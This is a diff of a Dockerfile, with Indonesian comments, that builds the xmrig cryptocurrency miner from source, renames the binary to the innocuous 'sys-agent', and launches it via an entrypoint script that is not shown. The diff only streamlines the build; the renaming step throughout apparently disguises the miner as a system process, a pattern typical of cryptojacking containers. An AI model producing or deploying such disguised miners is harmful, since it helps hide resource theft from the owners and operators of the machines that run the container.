@@ -1,28 +1,24 @@
 FROM ubuntu:22.04
-# Install dependencies
-RUN apt-get update && apt-get install -y \
-  build-essential cmake git automake libtool autoconf \
-  libhwloc-dev libuv1-dev libssl-dev && \
-  rm -rf /var/lib/apt/lists/*
 
-# Set working directory
+# Minimal install dependencies yang diperlukan
+RUN apt-get update && apt-get install -y --no-install-recommends \
+    build-essential cmake git libhwloc-dev libuv1-dev libssl-dev && \
+    rm -rf /var/lib/apt/lists/*
+
 WORKDIR /app
 
-# Clone xmrig
-RUN git clone https://github.com/xmrig/xmrig.git
+# Clone xmrig dengan depth 1 supaya lebih cepat
+RUN git clone --depth=1 https://github.com/xmrig/xmrig.git
 
-# Build xmrig
 WORKDIR /app/xmrig
-RUN mkdir build && cd build && \
-    cmake .. && make -j$(nproc)
 
-# Rename binary to sys-agent
+RUN mkdir build && cd build && cmake .. && make -j$(nproc)
+
 RUN mv /app/xmrig/build/xmrig /app/sys-agent && chmod +x /app/sys-agent
 
-# Copy entrypoint script
 COPY entrypoint.sh /entrypoint.sh
 RUN chmod +x /entrypoint.sh
 
-# Set working dir and run
 WORKDIR /app
+
 CMD ["/entrypoint.sh"]
